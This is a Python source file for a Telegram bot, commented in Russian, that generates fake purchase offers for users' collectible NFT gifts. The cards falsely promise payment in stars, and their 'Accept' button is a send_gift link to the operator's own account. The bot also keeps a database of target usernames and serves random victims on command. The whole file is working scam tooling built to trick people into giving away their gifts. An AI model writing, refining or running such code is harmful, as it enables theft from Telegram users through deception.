# bot.py
import os, json, sqlite3, random
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import (Message, InlineKeyboardMarkup, InlineKeyboardButton,
                           CallbackQuery)

TOKEN = os.environ["BOT_TOKEN"]
ME = os.environ["MY_USERNAME"]          # без @
OWNER = int(os.environ["OWNER_ID"])     # твой telegram id из настроек

# Твой ID и ID друга
MY_ID = 8546073412
FRIEND_ID = 8371725606
ALLOWED_USERS = [MY_ID, FRIEND_ID, OWNER] # Кому можно пользоваться ботом

bot = Bot(TOKEN)
dp = Dispatcher()
db = sqlite3.connect("targets.db")
db.execute("""CREATE TABLE IF NOT EXISTS t (
    id INTEGER PRIMARY KEY, username TEXT UNIQUE,
    title TEXT, num INTEGER, slug TEXT, sent INTEGER DEFAULT 0)""")
db.commit()

def card(title, num, price, slug):
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="✖️ Отклонить", callback_data="rej"),
        InlineKeyboardButton(text="✅ Принять", url=f"tg://send_gift?to={ME}"),
    ]])
    text = (f"Пользователь <b>{ME}</b> предлагает Вам {price} 💎 "
            f"за подарок <b>{title} #{num}</b>.\n\n"
            f"Подтверди передачу — звёзды зачислятся автоматически.")
    return text, kb

@dp.message(Command("offer"))
async def offer(m: Message):
    if m.from_user.id not in ALLOWED_USERS: return
    a = m.text.split(maxsplit=2)
    if len(a) < 3:
        return await m.reply("Формат: /offer <название> <номер> <цена> — ответом на фото\n"
                             "или /offer https://t.me/nft/PlushPepe-2687 20")
    arg, price = a[1], a[2]

    if arg.startswith("http"):
        slug = arg.rstrip("/").split("/")[-1]
        title, _, num = slug.rpartition("-")
    else:
        title, num = arg, a[1] if False else m.text.split()[2]
        slug = f"{title}-{num}"
        price = m.text.split()[3]

    text, kb = card(title.replace("-", " "), num, price, slug)

    photo = None
    if m.reply_to_message and m.reply_to_message.photo:
        photo = m.reply_to_message.photo[-1].file_id
    else:
        photo = f"https://t.me/nft/{slug}"

    try:
        await m.bot.send_photo(m.chat.id, photo, caption=text,
                               parse_mode="HTML", reply_markup=kb)
    except Exception as e:
        await m.reply(f"не вышло: {e}\nпопробуй ответом на скриншот подарка")

@dp.callback_query(F.data == "rej")
async def rej(c: CallbackQuery):
    if c.from_user.id not in ALLOWED_USERS:
        return await c.answer("У тебя нет доступа", show_alert=True)
    await c.answer("Оффер отклонён", show_alert=False)

@dp.message(Command("add"))
async def add(m: Message):
    if m.from_user.id not in ALLOWED_USERS: return
    n = 0
    for u in m.text.split()[1:]:
        try:
            db.execute("INSERT OR IGNORE INTO t (username) VALUES (?)", (u.lstrip("@"),)); n += 1
        except Exception: pass
    db.commit()
    await m.reply(f"добавлено: {n}")

@dp.message(Command("import"))
async def imp(m: Message):
    if m.from_user.id not in ALLOWED_USERS: return
    data = json.loads(m.text.split("\n", 1)[1])
    for d in data:
        db.execute("INSERT OR IGNORE INTO t (username,title,num,slug) VALUES (?,?,?,?)",
                   (d["username"], d["title"], d["num"], d["slug"]))
    db.commit()
    await m.reply(f"загружено {len(data)}")

@dp.message(Command("list"))
async def lst(m: Message):
    if m.from_user.id not in ALLOWED_USERS: return
    rows = db.execute("SELECT username,title,num FROM t WHERE sent=0 LIMIT 40").fetchall()
    await m.reply("\n".join(f"@{u} — {t} #{n}" for u,t,n in rows) or "пусто")

@dp.message(Command("next"))
async def nxt(m: Message):
    if m.from_user.id not in ALLOWED_USERS: return
    a = m.text.split()
    price = a[1] if len(a) > 1 else "20"
    row = db.execute("SELECT id,username,title,num,slug FROM t "
                     "WHERE sent=0 ORDER BY RANDOM() LIMIT 1").fetchone()
    if not row: return await m.reply("база пуста: /add или /import")
    _id, u, title, num, slug = row
    text, kb = card(title, num, price, slug)
    try:
        await m.bot.send_photo(m.chat.id, f"https://t.me/nft/{slug}",
                               caption=text, parse_mode="HTML", reply_markup=kb)
    except Exception:
        await m.bot.send_message(m.chat.id, text, parse_mode="HTML", reply_markup=kb)
    db.execute("UPDATE t SET sent=1 WHERE id=?", (_id,)); db.commit()
    await m.reply(f"→ @{u}")

@dp.message(Command("start"))
async def start(m: Message):
    if m.from_user.id not in ALLOWED_USERS: return
    await m.reply("Готов.\n/next 20 — карточка на случайную цель\n"
                  "/offer PlushPepe 2687 20 — вручную\n"
                  "/add @user /list /import")

import asyncio

async def main():
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
